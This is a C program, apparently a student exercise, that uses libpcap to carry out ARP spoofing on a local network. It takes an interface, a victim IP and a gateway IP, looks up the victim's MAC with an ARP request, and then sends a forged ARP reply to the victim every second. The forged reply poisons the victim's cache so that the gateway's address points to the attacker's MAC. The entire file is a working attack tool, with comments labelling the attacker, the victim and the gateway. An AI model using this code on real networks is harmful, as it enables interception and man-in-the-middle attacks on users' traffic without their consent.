#include "get_network_address.h"
#include <pcap.h>
#include <string.h>
#include <stdio.h>

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0

struct ethernet
{
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint16_t type;
};

struct arp
{
    uint16_t HW_type;
    uint16_t proto_type;
    uint8_t HW_length;
    uint8_t proto_length;
    uint16_t op;
    uint8_t sender_HW_addr[6];
    uint8_t sender_proto_addr[4];
    uint8_t target_HW_addr[6];
    uint8_t target_proto_addr[4];
};
//ARP Req : 1 ARP Rep : 2
struct send_ARP_packet
{
    ethernet eth_packet;
    arp arp_packet;
};

void usage() {
  printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
  printf("sample: pcap_test wlan0 192.168.10.2 192.168.10.1\n");
}


int main(int argc, char* argv[]) {

    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    unsigned char addr[4] = {0,}; // attacker ip
    unsigned char mac[7]; //attacker mac
    unsigned char sender_ip[4] = {0,}; //victim ip
    unsigned char sender_mac[7]; //victim mac
    unsigned char target_ip[4] = {0,}; //target ip
    u_char make_packet[42];
    const u_char* get_mac_packet;
    const u_char* attack_packet;
    char *ptr;
    char listenerrbuf[PCAP_ERRBUF_SIZE];
    char senderrbuf[PCAP_ERRBUF_SIZE];


    get_mac_address(mac,argv[1]); //get my mac
    get_ip_address(argv[1],addr); // get my ip


    // send----------------------------------------------------------------------------------------------------------
    pcap_t* sendhandle = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, 0, senderrbuf); //pacp handle for get victim mac

    ptr = strtok(argv[2],".");

    for(int i = 0; i < 4 ; i++)
    {
        sender_ip[i] = atoi(ptr);
        ptr = strtok(NULL, ".");
    }

    make_attack_packet(mac, addr, make_packet, argv[1], sender_ip);


    if (sendhandle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, senderrbuf);
        return -1;
    }

    get_mac_packet = make_packet;
    pcap_sendpacket(sendhandle, get_mac_packet, 42);



    while (true)
    {
        struct send_ARP_packet *get_packet;
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(sendhandle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;


        //int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);  send message
        if(packet[12] == 0x08 && packet[13] == 0x06 && packet[21] == 0x02)
        {


           get_packet = (struct send_ARP_packet *)packet;

           if(get_packet->arp_packet.sender_proto_addr[0] == sender_ip[0] && get_packet->arp_packet.sender_proto_addr[1] == sender_ip[1] && get_packet->arp_packet.sender_proto_addr[2] == sender_ip[2] && get_packet->arp_packet.sender_proto_addr[3] == sender_ip[3])
           {
               sender_mac[0] = get_packet->arp_packet.sender_HW_addr[0];
               sender_mac[1] = get_packet->arp_packet.sender_HW_addr[1];
               sender_mac[2] = get_packet->arp_packet.sender_HW_addr[2];
               sender_mac[3] = get_packet->arp_packet.sender_HW_addr[3];
               sender_mac[4] = get_packet->arp_packet.sender_HW_addr[4];
               sender_mac[5] = get_packet->arp_packet.sender_HW_addr[5];
               break;
           }
        }
    }


    //attack !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

    ptr = strtok(argv[3],".");

    for(int i = 0; i < 4 ; i++)
    {
        target_ip[i] = atoi(ptr);
        ptr = strtok(NULL, ".");
    }

    //void make_attack_packet(u_char *make_packet, u_char *mac, u_char * target_ip, u_char *sender_mac, u_char * sender_ip)
    make_attack_packet(make_packet, mac, target_ip, sender_mac, sender_ip);
    attack_packet = make_packet;

    while(1)
    {
        sleep(1);
        printf("keep attack to %d.%d.%d.%d\n\n", sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3]);
        pcap_sendpacket(sendhandle, attack_packet, 42);
    }
    pcap_close(sendhandle);
    return 0;
}



//sender : Victim
//target : gateway
// send arp request to Victim
// recive reply packet from victim
// send - arp reply packet ip = gateway mac = my  dest - mac
